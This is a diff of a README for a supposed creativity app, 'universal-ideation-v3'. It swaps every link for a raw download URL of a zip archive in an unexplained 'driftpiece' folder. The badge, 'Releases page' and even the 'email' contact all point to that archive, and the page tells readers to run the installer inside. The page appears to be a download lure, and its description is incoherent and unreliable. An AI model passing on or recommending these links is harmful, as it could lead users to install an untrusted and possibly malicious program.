@@ -1,6 +1,6 @@
 # 🌟 universal-ideation-v3 - Unlock Your Creative Potential Effortlessly
 
-[![Download Latest Release](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip)
+[![Download Latest Release](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ To start using universal-ideation-v3, follow these steps:
    - Python: Version 3.7 or higher (Recommended)
 
 2. **Visit the Releases Page**
-   To download the application, visit the [Releases page](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip).
+   To download the application, visit the [Releases page](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip).
 
 3. **Download the Application**
    Find the latest version on the Releases page and click on it. Follow the download instructions provided there.
@@ -28,7 +28,7 @@ To start using universal-ideation-v3, follow these steps:
 To download and install the application:
 
 1. **Download the Application**
-   Go to the [Releases page](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip) and select the latest version. Click the download link for your operating system.
+   Go to the [Releases page](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip) and select the latest version. Click the download link for your operating system.
 
 2. **Install the Application**
    Once the download completes, locate the file in your downloads folder. Double-click on the installer file and follow the on-screen instructions. 
@@ -71,6 +71,6 @@ Stay informed about new releases, features, and updates. Follow the repository t
 
 ## 📞 Contact
 
-For further inquiries or support, reach us via email at https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip
+For further inquiries or support, reach us via email at https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip
 
-[![Download Latest Release](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/universal-ideation-v-v3.3.zip)
+[![Download Latest Release](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip%20Latest%20Release-v1.0-blue)](https://github.com/afa567/universal-ideation-v3/raw/refs/heads/main/driftpiece/ideation-universal-v-v1.7.zip)
